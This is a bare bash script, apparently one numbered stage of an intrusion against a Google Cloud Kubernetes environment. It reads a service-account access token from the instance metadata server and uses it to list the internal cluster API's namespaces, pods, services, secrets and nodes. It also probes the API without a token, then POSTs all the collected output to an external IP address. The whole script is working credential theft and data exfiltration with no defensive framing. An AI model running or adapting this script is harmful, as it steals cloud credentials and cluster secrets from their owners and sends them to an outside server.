#!/bin/bash
{
echo "==S29=="
echo "==GCP_TOKEN=="
T=$(curl -sf -m5 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
echo "T_LEN:${#T}"

echo "==K8S_NAMESPACES=="
curl -sfk -H "Authorization: Bearer $T" "https://10.128.32.1:443/api/v1/namespaces" 2>&1 | head -300

echo "==K8S_PODS=="
curl -sfk -H "Authorization: Bearer $T" "https://10.128.32.1:443/api/v1/pods" 2>&1 | head -500

echo "==K8S_SERVICES=="
curl -sfk -H "Authorization: Bearer $T" "https://10.128.32.1:443/api/v1/services" 2>&1 | head -300

echo "==K8S_SECRETS=="
curl -sfk -H "Authorization: Bearer $T" "https://10.128.32.1:443/api/v1/secrets" 2>&1 | head -300

echo "==K8S_NODES=="
curl -sfk -H "Authorization: Bearer $T" "https://10.128.32.1:443/api/v1/nodes" 2>&1 | head -200

echo "==K8S_NOTOKEN=="
curl -sfk "https://10.128.32.1:443/version" 2>&1
curl -sfk "https://10.128.32.1:443/api" 2>&1 | head -20

echo "==END=="
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s29 --data-binary @-
